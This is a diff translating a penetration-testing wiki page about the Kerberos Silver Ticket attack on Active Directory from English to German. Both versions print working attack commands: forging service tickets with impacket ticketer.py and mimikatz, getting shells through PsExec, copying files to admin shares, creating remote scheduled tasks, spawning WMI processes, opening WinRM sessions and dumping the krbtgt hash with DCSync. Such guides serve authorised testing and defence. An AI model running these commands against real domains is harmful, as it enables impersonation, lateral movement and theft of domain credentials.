@@ -4,26 +4,23 @@
 
 <figure><img src="../../images/i3.png" alt=""><figcaption></figcaption></figure>
 
-**Bug bounty tip**: **sign up** for **Intigriti**, a premium **bug bounty platform created by hackers, for hackers**! Join us at [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) today, and start earning bounties up to **$100,000**!
+**Bug bounty tip**: **melden Sie sich an** bei **Intigriti**, einer Premium-**Bug-Bounty-Plattform, die von Hackern für Hacker erstellt wurde**! Treten Sie uns bei [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) heute bei und beginnen Sie, Belohnungen von bis zu **100.000 $** zu verdienen!
 
 {% embed url="https://go.intigriti.com/hacktricks" %}
 
 ## Silver ticket
 
-The **Silver Ticket** attack involves the exploitation of service tickets in Active Directory (AD) environments. This method relies on **acquiring the NTLM hash of a service account**, such as a computer account, to forge a Ticket Granting Service (TGS) ticket. With this forged ticket, an attacker can access specific services on the network, **impersonating any user**, typically aiming for administrative privileges. It's emphasized that using AES keys for forging tickets is more secure and less detectable.
+Der **Silver Ticket**-Angriff beinhaltet die Ausnutzung von Diensttickets in Active Directory (AD)-Umgebungen. Diese Methode basiert auf der **Erwerbung des NTLM-Hashes eines Dienstkontos**, wie z.B. eines Computer-Kontos, um ein Ticket Granting Service (TGS)-Ticket zu fälschen. Mit diesem gefälschten Ticket kann ein Angreifer auf bestimmte Dienste im Netzwerk zugreifen und **jede Benutzeridentität nachahmen**, wobei typischerweise administrative Berechtigungen angestrebt werden. Es wird betont, dass die Verwendung von AES-Schlüsseln zur Fälschung von Tickets sicherer und weniger nachweisbar ist.
 
-For ticket crafting, different tools are employed based on the operating system:
+Für die Ticket-Erstellung werden je nach Betriebssystem unterschiedliche Werkzeuge eingesetzt:
 
-### On Linux
-
+### Auf Linux
 ```bash
 python ticketer.py -nthash <HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> -spn <SERVICE_PRINCIPAL_NAME> <USER>
 export KRB5CCNAME=/root/impacket-examples/<TICKET_NAME>.ccache
 python psexec.py <DOMAIN>/<USER>@<TARGET> -k -no-pass
 ```
-
-### On Windows
-
+### Auf Windows
 ```bash
 # Create the ticket
 mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> /rc4:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET>"
@@ -35,47 +32,44 @@ mimikatz.exe "kerberos::ptt <TICKET_FILE>"
 # Obtain a shell
 .\PsExec.exe -accepteula \\<TARGET> cmd
 ```
+Der CIFS-Dienst wird als häufiges Ziel hervorgehoben, um auf das Dateisystem des Opfers zuzugreifen, aber auch andere Dienste wie HOST und RPCSS können für Aufgaben und WMI-Abfragen ausgenutzt werden.
 
-The CIFS service is highlighted as a common target for accessing the victim's file system, but other services like HOST and RPCSS can also be exploited for tasks and WMI queries.
+## Verfügbare Dienste
 
-## Available Services
+| Diensttyp                                  | Dienst-Silber-Tickets                                                    |
+| ------------------------------------------ | ------------------------------------------------------------------------ |
+| WMI                                        | <p>HOST</p><p>RPCSS</p>                                                |
+| PowerShell Remoting                        | <p>HOST</p><p>HTTP</p><p>Je nach Betriebssystem auch:</p><p>WSMAN</p><p>RPCSS</p> |
+| WinRM                                      | <p>HOST</p><p>HTTP</p><p>In einigen Fällen können Sie einfach nachfragen: WINRM</p> |
+| Geplante Aufgaben                          | HOST                                                                   |
+| Windows-Dateifreigabe, auch psexec        | CIFS                                                                   |
+| LDAP-Operationen, einschließlich DCSync   | LDAP                                                                   |
+| Windows Remote Server Administration Tools  | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                     |
+| Goldene Tickets                            | krbtgt                                                                 |
 
-| Service Type                               | Service Silver Tickets                                                     |
-| ------------------------------------------ | -------------------------------------------------------------------------- |
-| WMI                                        | <p>HOST</p><p>RPCSS</p>                                                    |
-| PowerShell Remoting                        | <p>HOST</p><p>HTTP</p><p>Depending on OS also:</p><p>WSMAN</p><p>RPCSS</p> |
-| WinRM                                      | <p>HOST</p><p>HTTP</p><p>In some occasions you can just ask for: WINRM</p> |
-| Scheduled Tasks                            | HOST                                                                       |
-| Windows File Share, also psexec            | CIFS                                                                       |
-| LDAP operations, included DCSync           | LDAP                                                                       |
-| Windows Remote Server Administration Tools | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                         |
-| Golden Tickets                             | krbtgt                                                                     |
-
-Using **Rubeus** you may **ask for all** these tickets using the parameter:
+Mit **Rubeus** können Sie **alle** diese Tickets mit dem Parameter anfordern:
 
 - `/altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm`
 
-### Silver tickets Event IDs
+### Ereignis-IDs für Silber-Tickets
 
-- 4624: Account Logon
-- 4634: Account Logoff
-- 4672: Admin Logon
+- 4624: Kontoanmeldung
+- 4634: Abmeldung des Kontos
+- 4672: Anmeldung des Administrators
 
-## Abusing Service tickets
+## Missbrauch von Diensttickets
 
-In the following examples lets imagine that the ticket is retrieved impersonating the administrator account.
+In den folgenden Beispielen stellen wir uns vor, dass das Ticket unter Verwendung des Administratorkontos abgerufen wird.
 
 ### CIFS
 
-With this ticket you will be able to access the `C$` and `ADMIN$` folder via **SMB** (if they are exposed) and copy files to a part of the remote filesystem just doing something like:
-
+Mit diesem Ticket können Sie auf den `C$`- und `ADMIN$`-Ordner über **SMB** zugreifen (wenn sie exponiert sind) und Dateien in einen Teil des Remote-Dateisystems kopieren, indem Sie einfach etwas tun wie:
 ```bash
 dir \\vulnerable.computer\C$
 dir \\vulnerable.computer\ADMIN$
 copy afile.txt \\vulnerable.computer\C$\Windows\Temp
 ```
-
-You will also be able to obtain a shell inside the host or execute arbitrary commands using **psexec**:
+Sie können auch eine Shell im Host erhalten oder beliebige Befehle mit **psexec** ausführen:
 
 {{#ref}}
 ../lateral-movement/psexec-and-winexec.md
@@ -83,8 +77,7 @@ You will also be able to obtain a shell inside the host or execute arbitrary com
 
 ### HOST
 
-With this permission you can generate scheduled tasks in remote computers and execute arbitrary commands:
-
+Mit dieser Berechtigung können Sie geplante Aufgaben auf Remote-Computern erstellen und beliebige Befehle ausführen:
 ```bash
 #Check you have permissions to use schtasks over a remote server
 schtasks /S some.vuln.pc
@@ -96,11 +89,9 @@ schtasks /query /S some.vuln.pc
 #Run created schtask now
 schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"
 ```
-
 ### HOST + RPCSS
 
-With these tickets you can **execute WMI in the victim system**:
-
+Mit diesen Tickets können Sie **WMI im Opfersystem ausführen**:
 ```bash
 #Check you have enough privileges
 Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local
@@ -110,8 +101,7 @@ Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlis
 #You can also use wmic
 wmic remote.computer.local list full /format:list
 ```
-
-Find **more information about wmiexec** in the following page:
+Finde **weitere Informationen über wmiexec** auf der folgenden Seite:
 
 {{#ref}}
 ../lateral-movement/wmiexec.md
@@ -119,32 +109,28 @@ Find **more information about wmiexec** in the following page:
 
 ### HOST + WSMAN (WINRM)
 
-With winrm access over a computer you can **access it** and even get a PowerShell:
-
+Mit winrm-Zugriff auf einen Computer kannst du **darauf zugreifen** und sogar eine PowerShell erhalten:
 ```bash
 New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
 ```
-
-Check the following page to learn **more ways to connect with a remote host using winrm**:
+Überprüfen Sie die folgende Seite, um **mehr Möglichkeiten zu erfahren, sich mit einem Remote-Host über winrm zu verbinden**:
 
 {{#ref}}
 ../lateral-movement/winrm.md
 {{#endref}}
 
 > [!WARNING]
-> Note that **winrm must be active and listening** on the remote computer to access it.
+> Beachten Sie, dass **winrm aktiv und hörend** auf dem Remote-Computer sein muss, um darauf zuzugreifen.
 
 ### LDAP
 
-With this privilege you can dump the DC database using **DCSync**:
-
+Mit diesem Privileg können Sie die DC-Datenbank mit **DCSync** dumpen:
 ```
 mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
 ```
+**Erfahren Sie mehr über DCSync** auf der folgenden Seite:
 
-**Learn more about DCSync** in the following page:
-
-## References
+## Referenzen
 
 - [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)
 - [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
@@ -155,9 +141,8 @@ dcsync.md
 
 <figure><img src="../../images/i3.png" alt=""><figcaption></figcaption></figure>
 
-**Bug bounty tip**: **sign up** for **Intigriti**, a premium **bug bounty platform created by hackers, for hackers**! Join us at [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) today, and start earning bounties up to **$100,000**!
+**Bug-Bounty-Tipp**: **Melden Sie sich an** bei **Intigriti**, einer Premium-**Bug-Bounty-Plattform, die von Hackern für Hacker erstellt wurde**! Treten Sie uns bei [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) heute bei und beginnen Sie, Prämien von bis zu **$100.000** zu verdienen!
 
 {% embed url="https://go.intigriti.com/hacktricks" %}
 
 {{#include ../../banners/hacktricks-training.md}}
-
